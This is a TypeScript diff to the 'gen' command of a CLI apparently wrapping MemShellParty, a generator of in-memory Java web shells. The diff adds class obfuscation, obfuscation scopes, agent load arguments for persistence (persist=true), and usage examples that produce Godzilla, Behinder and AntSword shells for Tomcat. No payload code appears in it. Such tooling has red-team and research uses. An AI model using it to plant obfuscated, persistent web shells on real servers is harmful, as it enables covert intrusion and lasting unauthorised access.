@@ -6,6 +6,8 @@ import { createClient, type GlobalOptions, logInfo } from "../cli-context.js";
 import { logOp } from "../core/oplog.js";
 import { emitSinglePackResult, hasMultiplePackResults } from "../core/output.js";
 import { buildMemShellRequest, type MemShellOptions } from "../core/request-builder.js";
+import { parseObfuscationOptions } from "../core/obfuscation.js";
+import { agentLoadExamples, supportsAgentLoadArguments } from "../core/agent.js";
 import { runMemShellWizard } from "../wizard/memshell-wizard.js";
 
 interface GenCmdOptions extends GlobalOptions {
@@ -20,6 +22,9 @@ interface GenCmdOptions extends GlobalOptions {
   shrink?: boolean;
   lambdaSuffix?: boolean;
   probe?: boolean;
+  obfuscate?: boolean;
+  obfuscationOptions?: string;
+  obfuscationScope?: "ALL" | "MEMSHELL_INJECTOR" | "INJECTOR" | "MEMSHELL";
   shellClassName?: string;
   godzillaPass?: string;
   godzillaKey?: string;
@@ -40,6 +45,7 @@ interface GenCmdOptions extends GlobalOptions {
   decode?: boolean;
   json?: boolean;
   interactive?: boolean;
+  agentArgs?: string;
 }
 
 const REQUIRED = ["server", "tool", "type", "packer"] as const;
@@ -61,6 +67,9 @@ function toOptions(o: GenCmdOptions): MemShellOptions {
     shrink: o.shrink,
     lambdaSuffix: o.lambdaSuffix,
     probe: o.probe,
+    obfuscate: o.obfuscate,
+    obfuscationOptions: parseObfuscationOptions(o.obfuscationOptions),
+    obfuscationScope: o.obfuscationScope,
     shellClassName: o.shellClassName,
     godzillaPass: o.godzillaPass,
     godzillaKey: o.godzillaKey,
@@ -89,15 +98,25 @@ export function registerGenCommand(program: Command): void {
     .option("-t, --tool <tool>", "shell tool, e.g. Godzilla, Behinder, Command")
     .option("-y, --type <type>", "shell type, e.g. Listener, Filter, Servlet")
     .option("-p, --packer <packer>", "packer, e.g. Base64, Jar, JSP")
-    .option("--jdk <version>", "target JDK: java6/8/9/11/17/21, or a class-file major version")
+    .option("--jdk <version>", "target JDK: java6/8/9/11/17/21/25, or a class-file major version")
     .option("--debug", "enable debug output in the payload")
     .option("--bypass-module", "bypass Java module restrictions")
     .option("--no-shrink", "disable bytecode shrinking (enabled by default)")
     .option("--lambda-suffix", "append a lambda class-name suffix")
     .option("--probe", "use echo/probe mode")
+    .option("--obfuscate", "enable class obfuscation (MemShellParty v3+)")
+    .option("--obfuscation-options <options>", "obfuscation overrides: key=value, comma-separated")
+    .addOption(
+      new Option("--obfuscation-scope <scope>", "obfuscation scope (MemShellParty v3+)").choices([
+        "ALL",
+        "MEMSHELL_INJECTOR",
+        "INJECTOR",
+        "MEMSHELL",
+      ]),
+    )
     .option("--shell-class-name <name>", "explicit shell class name (random if omitted)")
-    .option("--godzilla-pass <pass>", "Godzilla password")
-    .option("--godzilla-key <key>", "Godzilla key")
+    .option("--godzilla-pass <pass>", "Godzilla / GodzillaSession password")
+    .option("--godzilla-key <key>", "Godzilla / GodzillaSession key")
     .option("--behinder-pass <pass>", "Behinder password")
     .option("--antsword-pass <pass>", "AntSword password")
     .option("--command-param-name <name>", "Command tool parameter name")
@@ -111,6 +130,7 @@ export function registerGenCommand(program: Command): void {
     .option("--url-pattern <pattern>", "injector URL pattern")
     .option("--injector-class-name <name>", "explicit injector class name")
     .option("--no-static-initialize", "disable injector static initialization (enabled by default)")
+    .option("--agent-args <args>", "Agent load-time arguments, e.g. persist=true or restore=true (not sent to the generate API)")
     .option("-o, --output <file>", "write payload to a file instead of stdout")
     .addOption(new Option("--decode", "base64-decode the payload before writing"))
     .addOption(new Option("--no-decode", "do not base64-decode the payload"))
@@ -129,12 +149,13 @@ Examples:
   $ memparty gen -s Tomcat -t Command -y Filter -p DefaultBase64 \\
       --command-param-name cmd --encryptor RAW --implementation-class RuntimeExec
   $ memparty gen -s Tomcat -t Godzilla -y Listener -p DefaultBase64 --json
+  $ memparty gen -s Tomcat -t Godzilla -y AgentFilterChain -p AgentJar --agent-args persist=true
 
 Note: run 'memparty config' to list the available servers, tools, shell
-types and packers. Some packers (e.g. Base64) are aggregate packers that
-return several variants at once — pick a leaf packer (e.g. DefaultBase64)
-for a single payload (-o refuses aggregate results). The --json output
-includes the gate header (shellToolConfig) you need for
+types and packers. On v3, parent packers are categories — pick a concrete
+variant (e.g. DefaultBase64 instead of Base64). Legacy v2 backends still
+support aggregate packers, but -o cannot write several variants to one file.
+The --json output includes the gate header (shellToolConfig) you need for
 'memparty connect' / 'memparty exec'.
 `,
     )
@@ -161,6 +182,13 @@ includes the gate header (shellToolConfig) you need for
       }
 
       const request = buildMemShellRequest(memOpts);
+      const { agentArgs } = opts;
+      if (agentArgs !== undefined && !supportsAgentLoadArguments(memOpts.shellType, memOpts.packer)) {
+        throw new Error(
+          "--agent-args requires an Agent* shell type " +
+            "and an AgentJar, AgentJarWithJDKAttacher, or AgentJarWithJREAttacher packer.",
+        );
+      }
       // safe summary for the op log — parameters only, never credentials
       const genMeta = {
         server: memOpts.server,
@@ -201,7 +229,11 @@ includes the gate header (shellToolConfig) you need for
           opts.output !== undefined
             ? emitSinglePackResult(response, { outFile: opts.output, decode: opts.decode })
             : undefined;
-        const doc = outputFile === undefined ? response : { ...response, outputFile };
+        const doc = {
+          ...response,
+          ...(outputFile === undefined ? {} : { outputFile }),
+          ...(agentArgs === undefined ? {} : { agentArgs, agentLoadExamples: agentLoadExamples(agentArgs) }),
+        };
         process.stdout.write(`${JSON.stringify(doc, null, 2)}\n`);
         return;
       }
@@ -230,6 +262,9 @@ includes the gate header (shellToolConfig) you need for
       });
       if (result.destination !== "stdout") {
         logInfo(`wrote ${result.size} bytes to ${result.destination}${result.decoded ? " (base64-decoded)" : ""}`);
+      }
+      if (agentArgs !== undefined) {
+        for (const example of agentLoadExamples(agentArgs)) logInfo(`load: ${example}`);
       }
     });
 }
